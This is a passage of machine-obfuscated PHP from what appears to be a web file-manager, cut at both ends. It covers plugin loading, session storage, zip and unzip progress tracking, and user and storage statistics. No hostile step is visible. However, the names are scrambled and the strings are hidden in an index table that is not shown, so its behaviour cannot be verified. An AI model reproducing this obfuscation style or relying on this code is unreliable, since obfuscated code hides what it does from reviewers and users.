array_to_keyvalue($œ»«¨§[$ãüÒË®ş[76]], $ãüÒË®ş[12], $ãüÒË®ş[403]); $”õè”æä = array_merge($ÖÅŞÕÀ, $Ô¨Ôê²Í); foreach ($¾œ®½¬ù as $Ÿ­ó©¬) { if (!in_array($Ÿ­ó©¬, $”õè”æä)) { $¤Äâ¶¸[] = $Ÿ­ó©¬; } } if ($¤Äâ¶¸) { $this->removeBySource($÷¨ş‰²—, $¤Äâ¶¸); } return $œ»«¨§; } protected function listData($À†äµ¨‰) { $‰…ë¾³ª =& $_SERVER[¥Ÿ©ÒèÌ]; $î‘ìÀ”ß = array($‰…ë¾³ª[1630] => 0, $‰…ë¾³ª[483] => array($‰…ë¾³ª[1919], 0), $‰…ë¾³ª[423] => $‰…ë¾³ª[1920] . $À†äµ¨‰); $é·§¿‰ = $‰…ë¾³ª[1921]; $æ¸Á˜Çƒ = $this->field($é·§¿‰)->where($î‘ìÀ”ß)->order($‰…ë¾³ª[1922])->select(); return $æ¸Á˜Çƒ ? $æ¸Á˜Çƒ : array(); } protected function addToTag($øºë´ , $ŸÏ›áÁ, $¥ù´áÌ) { $¬ê³Øö =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->getByTagID($øºë´ , $¥ù´áÌ) || !$ŸÏ›áÁ) { return !1; } if (!Model($¬ê³Øö[815])->pathInfo($ŸÏ›áÁ)) { return !1; } $Œ†ô‘îº = array($¬ê³Øö[1630] => 0, $¬ê³Øö[483] => $¥ù´áÌ, $¬ê³Øö[422] => $ŸÏ›áÁ, $¬ê³Øö[423] => $¬ê³Øö[1923] . $øºë´ , $¬ê³Øö[421] => $¬ê³Øö[12], $¬ê³Øö[1811] => 0); if ($this->where($Œ†ô‘îº)->find()) { return !1; } return $this->add($Œ†ô‘îº); } protected function removeFromTag($Šë˜ˆÏÕ, $‹Ø‚¶–, $·Æ¡µÂÎ) { $§àÔ½À =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->getByTagID($Šë˜ˆÏÕ, $·Æ¡µÂÎ) || !$‹Ø‚¶–) { return !1; } if (is_array($‹Ø‚¶–)) { $‹Ø‚¶– = array($§àÔ½À[7], $‹Ø‚¶–); } $Øğ¬¡ = array($§àÔ½À[1630] => 0, $§àÔ½À[483] => $·Æ¡µÂÎ, $§àÔ½À[423] => $§àÔ½À[1923] . $Šë˜ˆÏÕ, $§àÔ½À[422] => $‹Ø‚¶–); return $this->where($Øğ¬¡)->delete(); } protected function removeByTag($úëÙŒï¼, $ÀË¿å¥¶) { $ºÕ‰¿İš =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->getByTagID($úëÙŒï¼, $ÀË¿å¥¶)) { return !1; } $²¦¼å‹¶ = array($ºÕ‰¿İš[1630] => 0, $ºÕ‰¿İš[483] => $ÀË¿å¥¶, $ºÕ‰¿İš[423] => $ºÕ‰¿İš[1923] . $úëÙŒï¼); return $this->where($²¦¼å‹¶)->delete(); } protected function removeBySource($‚õÓÆı‚, $øë™«Ëâ) { $êŸÏ„°ö =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$‚õÓÆı‚ || !$øë™«Ëâ) { return !1; } if (is_array($øë™«Ëâ)) { $øë™«Ëâ = array($êŸÏ„°ö[7], $øë™«Ëâ); } $ˆßåÉª = array($êŸÏ„°ö[1630] => 0, $êŸÏ„°ö[422] => $øë™«Ëâ, $êŸÏ„°ö[483] => array($êŸÏ„°ö[1000], 0), $êŸÏ„°ö[423] => $êŸÏ„°ö[1923] . $‚õÓÆı‚); return $this->where($ˆßåÉª)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\160\x6c\x75\147\151\156\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\x65", "\163\164\141\x74\165\163", "\162\145\147\151\x65\163\164", "\x63\157\x6e\x66\151\x67"); public function loadList($º·­é§ò = false) { $¨ËÄÌ” = array_to_keyvalue($this->listData(), $_SERVER[¥Ÿ©ÒèÌ][32]); if ($º·­é§ò) { return $¨ËÄÌ”[$º·­é§ò]; } return $¨ËÄÌ”; } public function init() { $÷é‚Ç°¦ =& $_SERVER[¥Ÿ©ÒèÌ]; Hook::trigger($÷é‚Ç°¦[1924]); $ı×ØÊ„” = $this->loadPluginList(); foreach ($ı×ØÊ„” as $ıµ¨•¦´ => $¡š¨µ¹) { $öı½Éºô = $this->appAllow($ıµ¨•¦´, $¡š¨µ¹); if (!$öı½Éºô) { continue; } foreach ($¡š¨µ¹[$÷é‚Ç°¦[1925]] as $Å¶¸ìÒ => $ˆ—ˆ’Åî) { Hook::bind($Å¶¸ìÒ, $ˆ—ˆ’Åî); } } Hook::trigger($÷é‚Ç°¦[1926]); Hook::trigger(ACTION); } public function appAllow($Îµ¾¨”Æ, $„ÓÀéçş, $Á§ÂÌÑú = true) { $­éŠşé¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $ˆƒ‡àå¾ = PLUGIN_DIR . $Îµ¾¨”Æ . $­éŠşé¬[1927]; if (!is_array($„ÓÀéçş) || !is_array($„ÓÀéçş[$­éŠşé¬[1925]]) || $„ÓÀéçş[$­éŠşé¬[740]] != 1 || !is_file($ˆƒ‡àå¾)) { return !1; } if ($GLOBALS[$­éŠşé¬[505]] == 1) { return !0; } if ($Á§ÂÌÑú && !Action($­éŠşé¬[1928])->checkAuth($Îµ¾¨”Æ)) { return !1; } return !0; } public function unInstall($Âƒ·æúç) { $êŞÁûÁ½ =& $_SERVER[¥Ÿ©ÒèÌ]; $ª¤çË¿ = $this->loadList($Âƒ·æúç); if (file_exists(PLUGIN_DIR . $Âƒ·æúç)) { Hook::apply($Âƒ·æúç . $êŞÁûÁ½[1929]); } $this->remove($ª¤çË¿[$êŞÁûÁ½[401]]); } public function changeStatus($şõ–£Æš, $ì›óÍ¦€) { $Ğ×©î¥ú =& $_SERVER[¥Ÿ©ÒèÌ]; $¾áø—Œ = $this->loadList($şõ–£Æš); if ($ì›óÍ¦€) { Hook::apply($şõ–£Æš . $Ğ×©î¥ú[1930]); } $this->update($¾áø—Œ[$Ğ×©î¥ú[401]], array($Ğ×©î¥ú[1931] => $ì›óÍ¦€)); } public function appRegist($Ò¢ÓÙÅ, $éÜ¢©úÛ) { $ùû‰ËÔÕ =& $_SERVER[¥Ÿ©ÒèÌ]; $ŒÔœ„¢á = $this->loadList($Ò¢ÓÙÅ); if ($ŒÔœ„¢á) { $this->update($ŒÔœ„¢á[$ùû‰ËÔÕ[401]], array($ùû‰ËÔÕ[1925] => $éÜ¢©úÛ)); } else { $À«ÅòŸµ = array($ùû‰ËÔÕ[32] => $Ò¢ÓÙÅ, $ùû‰ËÔÕ[1925] => $éÜ¢©úÛ, $ùû‰ËÔÕ[740] => 0, $ùû‰ËÔÕ[6] => $this->getConfigDefault($Ò¢ÓÙÅ)); $this->insert($À«ÅòŸµ); } } public function getConfigDefault($„¨·µ­) { $™ìüĞ¸— =& $_SERVER[¥Ÿ©ÒèÌ]; $ª’Ëí³• = array(); $¢Û¡±œÃ = $this->getPackageJson($„¨·µ­); if (!$¢Û¡±œÃ && is_array($¢Û¡±œÃ[$™ìüĞ¸—[1932]])) { return $ª’Ëí³•; } foreach ($¢Û¡±œÃ[$™ìüĞ¸—[1932]] as $¨•åŸŸ¸ => $åèÕ¥éÅ) { if (!isset($åèÕ¥éÅ[$™ìüĞ¸—[378]]) || isset($ª’Ëí³•[$¨•åŸŸ¸])) { continue; } $ª’Ëí³•[$¨•åŸŸ¸] = $åèÕ¥éÅ[$™ìüĞ¸—[378]]; } return $ª’Ëí³•; } public function getPackageJson($–¾Äû„Û) { return Hook::apply($–¾Äû„Û . $_SERVER[¥Ÿ©ÒèÌ][1933]); } public function getConfig($†ø¨ÈƒÛ, $÷ª¨“„ = false) { $ÎÔÎ‹Ç =& $_SERVER[¥Ÿ©ÒèÌ]; $ˆã©¢ï = array(); $ºçîÅ¿ = $this->loadList($†ø¨ÈƒÛ); if ($ºçîÅ¿ && is_array($ºçîÅ¿[$ÎÔÎ‹Ç[6]])) { $ˆã©¢ï = $ºçîÅ¿[$ÎÔÎ‹Ç[6]]; } if (!$ˆã©¢ï || $÷ª¨“„) { $ˆã©¢ï = $this->getConfigDefault($†ø¨ÈƒÛ); } return $ˆã©¢ï; } public function setConfig($©„¦´ÍË, $äÃËäÑƒ = false) { $Ñİ‘Š»º =& $_SERVER[¥Ÿ©ÒèÌ]; $Ìæô½ƒù = $this->loadList($©„¦´ÍË); if (!$Ìæô½ƒù) { return !1; } $Ğç§áı = $Ìæô½ƒù[$Ñİ‘Š»º[6]]; if ($äÃËäÑƒ == !1) { $Ğç§áı = array(); $äÃËäÑƒ = $this->getConfigDefault($©„¦´ÍË); } foreach ($äÃËäÑƒ as $åûÕã› => $ÕÅŸ©“§) { $Ğç§áı[$åûÕã›] = is_string($ÕÅŸ©“§) ? trim($ÕÅŸ©“§) : $ÕÅŸ©“§; } $this->update($Ìæô½ƒù[$Ñİ‘Š»º[401]], array($Ñİ‘Š»º[6] => $Ğç§áı)); } public function viewList() { $ºö·©™ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÃŞŒ™˜ = $this->loadList(); $this->pluginScan($ÃŞŒ™˜); $ÃŞŒ™˜ = $this->loadPluginList(); $Ì¥Å…¹ = array(); foreach ($ÃŞŒ™˜ as $¢ö«·‹ => $Í»¯ùåö) { unset($Í»¯ùåö[$ºö·©™[1925]], $Í»¯ùåö[$ºö·©™[6]]); $’óØå’ = PLUGIN_DIR . $Í»¯ùåö[$ºö·©™[32]] . $ºö·©™[1927]; if (!is_file($’óØå’)) { continue; } $ÀÆñ¬Ìø = Hook::apply($Í»¯ùåö[$ºö·©™[32]] . $ºö·©™[1933]); if (is_array($ÀÆñ¬Ìø)) { $Ì¥Å…¹[$¢ö«·‹] = array_merge($Í»¯ùåö, $ÀÆñ¬Ìø); } } return $Ì¥Å…¹; } private function loadPluginList() { $ÛäôÊ¸³ =& $_SERVER[¥Ÿ©ÒèÌ]; $¯ş¢úòŞ = $this->loadList(); if (strtolower(MOD) == $ÛäôÊ¸³[1934]) { return $¯ş¢úòŞ; } $ç÷—Ôõ¿ = Hook::trigger($ÛäôÊ¸³[1935], $¯ş¢úòŞ); if ($¯ş¢úòŞ && !$ç÷—Ôõ¿) { die; } return $ç÷—Ôõ¿ ? $ç÷—Ôõ¿ : $¯ş¢úòŞ; } private function pluginScan($Ë´œïûü) { $ÅëØËúÒ =& $_SERVER[¥Ÿ©ÒèÌ]; recursion_dir(PLUGIN_DIR, $¶¥«üø, $²—·´ä˜, 0); foreach ($¶¥«üø as $‰¼ô ı’) { $ÀúµÒí¯ = get_path_this($‰¼ô ı’); if (isset($Ë´œïûü[$ÀúµÒí¯]) || !file_exists($‰¼ô ı’ . $ÅëØËúÒ[1936]) || !file_exists($‰¼ô ı’ . $ÅëØËúÒ[1927])) { continue; } Hook::apply($ÀúµÒí¯ . $ÅëØËúÒ[1930]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\155\137\163\x65\x73\x73\x69\157\156"; public function get($½Ü‘ÁÜø) { $ÆÜâîÃÓ =& $_SERVER[¥Ÿ©ÒèÌ]; $””ƒ˜Öã = $this->where(array($ÆÜâîÃÓ[1937] => $½Ü‘ÁÜø))->find(); if (!is_array($””ƒ˜Öã)) { return !1; } return $””ƒ˜Öã[$ÆÜâîÃÓ[745]]; } public function set($ëé›°, $ŸæÜ­ûÌ, $Š«¸”’ = 3600) { $Šè¦ßí¿ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÌË±ì§ = array($Šè¦ßí¿[1937] => $ëé›°, $Šè¦ßí¿[1845] => $ŸæÜ­ûÌ, $Šè¦ßí¿[1938] => $Š«¸”’ + time()); if (Session::get($Šè¦ßí¿[1939])) { $ÌË±ì§[$Šè¦ßí¿[1639]] = Session::get($Šè¦ßí¿[1939]); } else { $ÌË±ì§[$Šè¦ßí¿[1639]] = 0; } if ($this->get($ëé›°)) { return $this->where(array($Šè¦ßí¿[1937] => $ëé›°))->save($ÌË±ì§); } else { return $this->add($ÌË±ì§, array(), !0); } } public function remove($„ŠïŸù) { return $this->where(array($_SERVER[¥Ÿ©ÒèÌ][1937] => $„ŠïŸù))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¥Ÿ©ÒèÌ][1940] . time())->delete(); } } goto f…«¹Ë‰¬; BõÔ˜ŠÑğ¨: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $çˆÃÏêŠ =& $_SERVER[¥Ÿ©ÒèÌ]; parent::startAfter(); Hook::bind($çˆÃÏêŠ[1728], array($this, $çˆÃÏêŠ[1729])); Hook::bind($çˆÃÏêŠ[1178], array($this, $çˆÃÏêŠ[1730])); $ŠÇ ‡†’ =& $this->task; $ŠÇ ‡†’[$çˆÃÏêŠ[1731]] = $çˆÃÏêŠ[1183]; if (!$ŠÇ ‡†’[$çˆÃÏêŠ[1539]]) { $ŠÇ ‡†’[$çˆÃÏêŠ[1539]] = LNG($çˆÃÏêŠ[1732]); } } protected function endAfter() { $« ÚË£ =& $_SERVER[¥Ÿ©ÒèÌ]; parent::endAfter(); Hook::unbind($« ÚË£[1728], array($this, $« ÚË£[1729])); Hook::unbind($« ÚË£[1178], array($this, $« ÚË£[1730])); } public function updateAfter() { $™îßšÙä =& $_SERVER[¥Ÿ©ÒèÌ]; $âÛÀµÖ± =& $this->task; if (!$âÛÀµÖ±[$™îßšÙä[776]] || !$âÛÀµÖ±[$™îßšÙä[753]]) { return; } if ($âÛÀµÖ±[$™îßšÙä[1731]] == $™îßšÙä[1183]) { $‹àÔÇÒî = 0; if ($âÛÀµÖ±[$™îßšÙä[1687]]) { $‹àÔÇÒî = $âÛÀµÖ±[$™îßšÙä[1688]] / $âÛÀµÖ±[$™îßšÙä[1687]]; } $âÛÀµÖ±[$™îßšÙä[1641]] = $‹àÔÇÒî * 0.3; } else { if ($âÛÀµÖ±[$™îßšÙä[1731]] == $™îßšÙä[317]) { $‹àÔÇÒî = $âÛÀµÖ±[$™îßšÙä[1640]] / $âÛÀµÖ±[$™îßšÙä[776]]; $âÛÀµÖ±[$™îßšÙä[1641]] = 0.3 + $‹àÔÇÒî * 0.4; } else { if ($âÛÀµÖ±[$™îßšÙä[1731]] == $™îßšÙä[108]) { $üìÖÖ±„ = 0; if ($âÛÀµÖ±[$™îßšÙä[1689]] == $™îßšÙä[108]) { $üìÖÖ±„ = $âÛÀµÖ±[$™îßšÙä[1688]]; } $‹àÔÇÒî = ($âÛÀµÖ±[$™îßšÙä[1692]] + $üìÖÖ±„) / $âÛÀµÖ±[$™îßšÙä[753]]; $âÛÀµÖ±[$™îßšÙä[1641]] = 0.3 + 0.4 + $‹àÔÇÒî * 0.3; } } } if ($âÛÀµÖ±[$™îßšÙä[1641]] > 0) { $×·éå£ù = timeFloat() - $âÛÀµÖ±[$™îßšÙä[1643]] - $âÛÀµÖ±[$™îßšÙä[1646]]; $âÛÀµÖ±[$™îßšÙä[1647]] = $×·éå£ù * (1 - $âÛÀµÖ±[$™îßšÙä[1641]]) / $âÛÀµÖ±[$™îßšÙä[1641]]; } } public function addFile($£ÙÏˆ–­) { $á«¡ñ =& $_SERVER[¥Ÿ©ÒèÌ]; $ˆºÏÊŠ =& $this->task; $õ„º«˜½ = IO::info($£ÙÏˆ–­); $ˆºÏÊŠ[$á«¡ñ[1685]] = $õ„º«˜½[$á«¡ñ[32]]; $ˆºÏÊŠ[$á«¡ñ[1687]] = $õ„º«˜½[$á«¡ñ[80]]; $ˆºÏÊŠ[$á«¡ñ[1688]] = 0; $ˆºÏÊŠ[$á«¡ñ[1050]] = $á«¡ñ[1707]; $ˆºÏÊŠ[$á«¡ñ[1689]] = $á«¡ñ[1183]; $ˆºÏÊŠ[$á«¡ñ[753]] = $õ„º«˜½[$á«¡ñ[80]]; $ˆºÏÊŠ[$á«¡ñ[776]] = 1; $·Á×Óƒ = 0; $ˆºÏÊŠ[$á«¡ñ[1696]] = array($á«¡ñ[1697] => $·Á×Óƒ + 1, $á«¡ñ[421] => $õ„º«˜½[$á«¡ñ[32]], $á«¡ñ[78] => $õ„º«˜½[$á«¡ñ[78]], $á«¡ñ[519] => $õ„º«˜½[$á«¡ñ[519]] ? $õ„º«˜½[$á«¡ñ[519]] : $õ„º«˜½[$á«¡ñ[78]]); $this->update(); } public function unzipAfter($¡­›òÒ’) { $ğß«¾“ =& $_SERVER[¥Ÿ©ÒèÌ]; $û¤÷Ï­Š =& $this->task; $û¤÷Ï­Š[$ğß«¾“[1731]] = $ğß«¾“[108]; $³˜²×ÃË = IO::infoWithChildren($¡­›òÒ’); $ùÂÜÔ¤ = 0; $û¤÷Ï­Š[$ğß«¾“[1696]] = array($ğß«¾“[1697] => $ùÂÜÔ¤ + 1, $ğß«¾“[421] => $³˜²×ÃË[$ğß«¾“[32]], $ğß«¾“[78] => $³˜²×ÃË[$ğß«¾“[78]], $ğß«¾“[519] => $³˜²×ÃË[$ğß«¾“[519]] ? $³˜²×ÃË[$ğß«¾“[519]] : $³˜²×ÃË[$ğß«¾“[78]]); if ($³˜²×ÃË[$ğß«¾“[33]] == $ğß«¾“[192]) { $û¤÷Ï­Š[$ğß«¾“[776]] = 1; } else { $û¤÷Ï­Š[$ğß«¾“[776]] = $³˜²×ÃË[$ğß«¾“[83]][$ğß«¾“[81]]; } $û¤÷Ï­Š[$ğß«¾“[1050]] = $ğß«¾“[12]; $û¤÷Ï­Š[$ğß«¾“[1689]] = 0; $û¤÷Ï­Š[$ğß«¾“[1640]] = 0; $û¤÷Ï­Š[$ğß«¾“[1687]] = 0; $û¤÷Ï­Š[$ğß«¾“[1688]] = 0; $û¤÷Ï­Š[$ğß«¾“[1685]] = $ğß«¾“[12]; $û¤÷Ï­Š[$ğß«¾“[1692]] = 0; $û¤÷Ï­Š[$ğß«¾“[753]] = $³˜²×ÃË[$ğß«¾“[80]]; $this->update(); self::log($ğß«¾“[1733] . json_encode(array($û¤÷Ï­Š, $³˜²×ÃË))); } public function nameParse($ş¯ãÍœ€) { $úƒÁìíş =& $_SERVER[¥Ÿ©ÒèÌ]; $àûŒ÷Ó =& $this->task; if ($àûŒ÷Ó[$úƒÁìíş[1731]] == $úƒÁìíş[1183]) { $àûŒ÷Ó[$úƒÁìíş[1731]] = $úƒÁìíş[317]; $àûŒ÷Ó[$úƒÁìíş[1692]] = 0; $àûŒ÷Ó[$úƒÁìíş[753]] = 0; } $Ÿ¿‹‡¤ = get_path_this($ş¯ãÍœ€); if (strstr($Ÿ¿‹‡¤, $úƒÁìíş[10])) { $àûŒ÷Ó[$úƒÁìíş[1640]] += 1; $àûŒ÷Ó[$úƒÁìíş[776]] += 1; } $àûŒ÷Ó[$úƒÁìíş[1685]] = $ş¯ãÍœ€; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ñß¤ß€ =& $_SERVER[¥Ÿ©ÒèÌ]; parent::startAfter(); Hook::bind($ñß¤ß€[1734], array($this, $ñß¤ß€[1729])); $²®çè®‰ =& $this->task; $²®çè®‰[$ñß¤ß€[1731]] = $ñß¤ß€[1183]; if (!$²®çè®‰[$ñß¤ß€[1539]]) { $²®çè®‰[$ñß¤ß€[1539]] = LNG($ñß¤ß€[1735]); } } protected function endAfter() { $õ”ö³»¯ =& $_SERVER[¥Ÿ©ÒèÌ]; parent::endAfter(); Hook::unbind($õ”ö³»¯[1734], array($this, $õ”ö³»¯[1729])); } public function updateAfter() { $†ÑÜó÷Ç =& $_SERVER[¥Ÿ©ÒèÌ]; $¿Ñ¼ÍŒ” =& $this->task; if (!$¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[776]] || !$¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[753]]) { return; } if ($¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1731]] == $†ÑÜó÷Ç[1183]) { $«•“ÜÈ = $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1688]]; if ($¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1689]] != $†ÑÜó÷Ç[1183]) { $«•“ÜÈ = 0; } $±ØÉ§æŠ = ($¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1692]] + $«•“ÜÈ) / $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[753]]; $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1641]] = $±ØÉ§æŠ * 0.3; } else { if ($¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1731]] == $†ÑÜó÷Ç[317]) { $±ØÉ§æŠ = $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1640]] / $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[776]]; $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1641]] = 0.3 + $±ØÉ§æŠ * 0.5; } else { if ($¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1731]] == $†ÑÜó÷Ç[108]) { $±ØÉ§æŠ = 0; if ($¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1687]]) { $±ØÉ§æŠ = $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1688]] / $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1687]]; } $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1641]] = 0.3 + 0.5 + $±ØÉ§æŠ * 0.2; } } } if ($¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1641]] > 0) { $†ñÎ¨ƒÎ = timeFloat() - $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1643]] - $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1646]]; $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1647]] = $†ñÎ¨ƒÎ * (1 - $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1641]]) / $¿Ñ¼ÍŒ”[$†ÑÜó÷Ç[1641]]; } } public function copyFileStart($Î€á©», $º…êôÕÀ, $š¦á„şÆ, $´úé±°€, $š»ÍùÍÊ, $˜¬æÇéñ) { $â¬àĞÊˆ =& $_SERVER[¥Ÿ©ÒèÌ]; parent::copyFileStart($Î€á©», $º…êôÕÀ, $š¦á„şÆ, $´úé±°€, $š»ÍùÍÊ, $˜¬æÇéñ); $—‰–óŞ =& $this->task; if ($—‰–óŞ[$â¬àĞÊˆ[1731]] == $â¬àĞÊˆ[317]) { $—‰–óŞ[$â¬àĞÊˆ[1731]] = $â¬àĞÊˆ[108]; } $this->update(); } public function copyFileEnd($š›Ø¾¯½, $‹„èêƒ…, $ŞÍÛ÷Ú, $…ÉÉ‹ª‘, $ù¨ÊÉòİ, $›ÊÖÄ»á) { $µ×ùÚÑ =& $_SERVER[¥Ÿ©ÒèÌ]; $ğÙˆ‘’½ =& $this->task; $ğÙˆ‘’½[$µ×ùÚÑ[1688]] = $ğÙˆ‘’½[$µ×ùÚÑ[1687]]; $ğÙˆ‘’½[$µ×ùÚÑ[1692]] += $ğÙˆ‘’½[$µ×ùÚÑ[1687]]; $ğÙˆ‘’½[$µ×ùÚÑ[1689]] = $µ×ùÚÑ[12]; $this->update(); } public function nameParse($¦ÈÆŠé) { $ñÆ¢™³ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÁİæøÀô =& $this->task; if ($ÁİæøÀô[$ñÆ¢™³[1640]] < $ÁİæøÀô[$ñÆ¢™³[776]]) { $ÇÑ®âÙ† = get_path_this($¦ÈÆŠé); if (strstr($ÇÑ®âÙ†, $ñÆ¢™³[10])) { $ÁİæøÀô[$ñÆ¢™³[1640]] += 1; } } if ($ÁİæøÀô[$ñÆ¢™³[1731]] == $ñÆ¢™³[1183]) { $ÁİæøÀô[$ñÆ¢™³[1731]] = $ñÆ¢™³[317]; } $ÁİæøÀô[$ñÆ¢™³[1685]] = $¦ÈÆŠé; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($§Û²Å¸ï) { $›÷ïÛÙ¼ =& $_SERVER[¥Ÿ©ÒèÌ]; $¦‡İÃ…é = array($›÷ïÛÙ¼[594] => array($›÷ïÛÙ¼[33] => $›÷ïÛÙ¼[1736], $›÷ïÛÙ¼[277] => array($›÷ïÛÙ¼[219], $›÷ïÛÙ¼[755], $›÷ïÛÙ¼[1737], $›÷ïÛÙ¼[1738])), $›÷ïÛÙ¼[1739] => array($›÷ïÛÙ¼[33] => $›÷ïÛÙ¼[1740], $›÷ïÛÙ¼[277] => array($›÷ïÛÙ¼[219], $›÷ïÛÙ¼[753], $›÷ïÛÙ¼[1741], $›÷ïÛÙ¼[1742], $›÷ïÛÙ¼[1743]))); if (!isset($¦‡İÃ…é[$§Û²Å¸ï])) { return !1; } $this->optionType = $¦‡İÃ…é[$§Û²Å¸ï][$›÷ïÛÙ¼[33]]; $this->field = $¦‡İÃ…é[$§Û²Å¸ï][$›÷ïÛÙ¼[277]]; return !0; } public function listData($’İ„ˆ = false, $õ•ÍèáÜ = "\155\x6f\144\x69\x66\x79\124\x69\155\145", $€¢µÇÚØ = false) { return parent::listData($’İ„ˆ, $õ•ÍèáÜ, $€¢µÇÚØ); } public function trendList($œéùæÇµ) { $”›¼ã‡Ë =& $_SERVER[¥Ÿ©ÒèÌ]; $åÇØÃ– = $this->listData(); if ($åÇØÃ–) { $€şÏ²ã = end($åÇØÃ–); $ÑÌÂ¶ë¿ = date($”›¼ã‡Ë[1744], strtotime($”›¼ã‡Ë[1745])); if ($€şÏ²ã[$”›¼ã‡Ë[219]] == $ÑÌÂ¶ë¿) { return $åÇØÃ–; } $­àŸßÀî = strtotime($€şÏ²ã[$”›¼ã‡Ë[219]]); } if (!isset($­àŸßÀî)) { $áŸ¿ûú¼ = $œéùæÇµ == $”›¼ã‡Ë[594] ? $”›¼ã‡Ë[538] : $”›¼ã‡Ë[815]; $­àŸßÀî = Model($áŸ¿ûú¼)->min($”›¼ã‡Ë[193]); } $ÇÄÒßÖß = $”›¼ã‡Ë[1746] . ucfirst($œéùæÇµ); $¡”åêÚ… = $this->dateList($­àŸßÀî); foreach ($¡”åêÚ… as $ÑÌÂ¶ë¿) { $this->{$ÇÄÒßÖß}($ÑÌÂ¶ë¿); } return $this->listData(); } private function dateList($¹ªı“Š¸) { $Ê‘ƒØœ =& $_SERVER[¥Ÿ©ÒèÌ]; $¸¢ã„•² = $¹ªı“Š¸; $¹ûÕ÷Ç´ = strtotime($Ê‘ƒØœ[1745]); $Øİá½–õ = array(); while ($¸¢ã„•² <= $¹ûÕ÷Ç´) { $Øİá½–õ[] = date($Ê‘ƒØœ[1744], $¸¢ã„•²); $¸¢ã„•² = strtotime($Ê‘ƒØœ[1747], $¸¢ã„•²); } return $Øİá½–õ; } public function _recordUser($Œ¾ˆÚ±ë = '') { $æ«ª»†” =& $_SERVER[¥Ÿ©ÒèÌ]; $ºÒ¿·Ñ = strtotime(date($æ«ª»†”[1748], strtotime($Œ¾ˆÚ±ë))); $”Š´ƒ£½ = strtotime(date($æ«ª»†”[1749], strtotime($Œ¾ˆÚ±ë))); $¹á‰ÙÒ© = array($æ«ª»†”[193] => array($æ«ª»†”[999], $”Š´ƒ£½)); $ÏÚ×Ñ”á = Model($æ«ª»†”[538])->where($¹á‰ÙÒ©)->count($æ«ª»†”[1639]); $¹á‰ÙÒ©[$æ«ª»†”[193]] = array($æ«ª»†”[337], array($ºÒ¿·Ñ, $”Š´ƒ£½)); $»Á›™û— = Model($æ«ª»†”[538])->where($¹á‰ÙÒ©)->count($æ«ª»†”[1639]); $¹á‰ÙÒ©[$æ«ª»†”[33]] = $æ«ª»†”[1750]; $œ›Ø‡Í© = Model($æ«ª»†”[1751])->where($¹á‰ÙÒ©)->count($æ«ª»†”[1752]); $É©º´‡Ë = array($æ«ª»†”[219] => $Œ¾ˆÚ±ë, $æ«ª»†”[755] => (int) $ÏÚ×Ñ”á, $æ«ª»†”[1737] => (int) $»Á›™û—, $æ«ª»†”[1738] => (int) $œ›Ø‡Í©); return $this->insert($É©º´‡Ë); } public function _recordStore($àóÃƒÊ€ = '') { $™«Ï¦Šø =& $_SERVER[¥Ÿ©ÒèÌ]; $†º×ÛÊö = strtotime(date($™«Ï¦Šø[1749], strtotime($àóÃƒÊ€))); $ØõÆ®â = array($™«Ï¦Šø[193] => array($™«Ï¦Šø[999], $†º×ÛÊö)); $õ³ñ«œ¬ = Model($™«Ï¦Šø[470])->where($ØõÆ®â)->sum($™«Ï¦Šø[80]); $ØõÆ®â[$™«Ï¦Šø[411]] = 0; $ƒäÏØ¼ = Model($™«Ï¦Šø[815])->where($ØõÆ®â)->sum($™«Ï¦Šø[80]); $ØõÆ®â[$™«Ï¦Šø[412]] = 1; $Òç¾“é˜ = Model($™«Ï¦Šø[815])->where($ØõÆ®â)->sum($™«Ï¦Šø[80]); $ØõÆ®â[$™«Ï¦Šø[412]] = 2; $±”×Ï›¨ = Model($™«Ï¦Šø[815])->where($ØõÆ®â)->sum($™«Ï¦Šø[80]); $‡ÈÚĞ¿ = array($™«Ï¦Šø[219] => $àóÃƒÊ€, $™«Ï¦Šø[753] => (int) $ƒäÏØ¼, $™«Ï¦Šø[1741] => (int) $õ³ñ«œ¬, $™«Ï¦Šø[1742] => (int) $Òç¾“é˜, $™«Ï¦Šø[1743] => (int) $±”×Ï›¨); return $this->insert($‡ÈÚĞ¿); } public function trend($µØ°Áó, $÷„üîéˆ) { $Ö´¢êã§ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->init($µØ°Áó)) { return !1; } $²¶şªÕ = $this->trendList($µØ°Áó); if ($²¶şªÕ && $÷„üîéˆ != $Ö´¢êã§[1612]) { $ÎÅÏÊøÈ = $²¶şªÕ[0][$Ö´¢êã§[219]]; $Îî÷…©ã = $this->validDate($÷„üîéˆ, $ÎÅÏÊøÈ); $¯ 